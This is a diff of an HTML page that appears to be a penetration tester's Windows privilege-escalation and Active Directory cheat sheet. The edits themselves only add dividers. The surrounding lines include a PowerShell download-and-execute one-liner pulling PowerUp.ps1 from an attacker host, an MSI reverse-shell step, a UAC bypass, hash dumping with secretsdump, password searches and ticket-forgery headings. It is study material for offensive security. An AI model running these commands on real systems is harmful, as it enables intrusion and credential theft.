@@ -14,6 +14,7 @@ layout: default
     <hr>
 
     <h2>Manual PrivEsc:</h2>
+
     <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate text)</li>
     <li>Check user groups and privileges</li>
     <ul>
@@ -150,9 +151,10 @@ layout: default
         <li>Kerberoast</li>
     </ul>
 
-    <br>
+    <hr>
 
     <h2>PrivEsc Tools</h2>
+
     <li>Powerup.ps1</li>
     <ul>
         <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
@@ -212,7 +214,7 @@ layout: default
         <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
     </ul>
 
-    <br>
+    <hr>
 
     <h2>cmd Commands</h2>
 
@@ -408,7 +410,10 @@ layout: default
         </tr>
     </table>
 
+    <hr>
+
     <h2>Powershell Commands</h2>
+
     <li>System Information & Control</li>
     <table>
         <tr>
@@ -517,7 +522,10 @@ layout: default
         </tr>
     </table>
 
+    <hr>
+
     <h2>File Transfers</h2>
+
     <li>Download to Windows</li>
     <table>
         <tr>
@@ -704,7 +712,10 @@ layout: default
         </tr>
     </table>
 
+    <hr>
+
     <h2>Startup Apps</h2>
+
     <li>Program for startup apps that should start for all users (including admin):</li>
     <ul>
         <li>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</li>
@@ -730,7 +741,10 @@ layout: default
         <li>cmd "cscript CreateShortCut.vbs"</li>
     </ul>
 
+    <hr>
+
     <h2>Prilivege Abuse</h2>
+
     <li>SeImpersonatePrivilege</li>
     <li>Rotten Potato</li>
     <ul>
@@ -900,9 +914,10 @@ layout: default
     </ul>
     <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>
 
-    <br>
+    <hr>
 
     <h2>Always Install Elevated</h2>
+
     <li>Check if enabled</li>
     <ul>
         <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
@@ -916,7 +931,10 @@ layout: default
         <li>Create msi reverse shell and execute it</li>
     </ul>
 
+    <hr>
+
     <h2>Autorun Applications</h2>
+
     <li>Enumerate Auto Run Programs</li>
     <ul>
         <li>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
@@ -926,7 +944,10 @@ layout: default
         </ul>
     </ul>
 
+    <hr>
+
     <h2>Insecure File Permissions</h2>
+
     <li>Look for files of any type that can help break into the system.  Scripts with hardcoded credentials, other sensitive files, etc.</li>
     <li>Search for world writable files:</li>
     <ul>
@@ -946,7 +967,10 @@ layout: default
         <li>findstr /si password *.xml *.ini *.txt</li>
     </ul>
 
+    <hr>
+
     <h2>Insecure Services</h2>
+
     <li>Manually enumerate insecure services</li>
     <table>
         <tr>
@@ -1207,7 +1231,10 @@ layout: default
         <li>Start the vulnerable service</li>
     </ul>
 
+    <hr>
+
     <h2>Scheduled Tasks</h2>
+
     <li>Tasks run at time intervals or by events (log-on, etc)</li>
     <li>Tasks run with privileges of user who created them.</li>
     <ul>
@@ -1221,6 +1248,8 @@ layout: default
     <li>Usually need to look for tasks based on other clues like finding a script or log file that shows a scheduled task is being run.</li>
     <li>look for a script running on a schedule and modify it with some malicious action.  Look into interesting directories.</li>
 </ul>
+
+<hr>
 
 <h2>Bypass UAC</h2>
 <li>UAC Bypass requires administrator account</li>
@@ -1292,6 +1321,8 @@ layout: default
     <li>bypassuac-x**.exe /c C:\directory\to\shell4444.exe</li>
 </ul>
 
+<hr>
+
 <h2>Finding Logged in Users</h2>
 
 <li>Enumerate Logged on Users</li>
@@ -1325,6 +1356,7 @@ layout: default
     </ul>
 </ul>
 
+<hr>
 
 <h2>Security Identifier (SID)</h2>
 
@@ -1357,6 +1389,8 @@ layout: default
         <td>Relative ID</td>
     </tr>
 </table>
+
+<hr>
 
 <h2>Dump Hashes</h2>
 
@@ -1440,6 +1474,8 @@ layout: default
         <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
     </ul>
 </ul>
+
+<hr>
 
 <h2>Active Directory</h2>
 
@@ -1612,6 +1648,8 @@ layout: default
     </ul>
 </ul>
 
+<hr>
+
 <h2>Credential Usage</h2>
 
 <table>
@@ -1687,6 +1725,8 @@ layout: default
         </tr>
     </table>
 
+    <hr>
+
     <h2>Overpass the Hash</h2>
 
     <li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
@@ -1719,6 +1759,8 @@ layout: default
             <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
         </ul>
     </ul>
+
+    <hr>
 
     <h2>Silver Ticket</h2>
     <li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service account has permissions to</li>
@@ -1755,6 +1797,8 @@ layout: default
             <li>Kerberos::list</li>
         </ul>
     </ul>
+
+    <hr>
 
     <h2>Golden Ticket</h2>
 
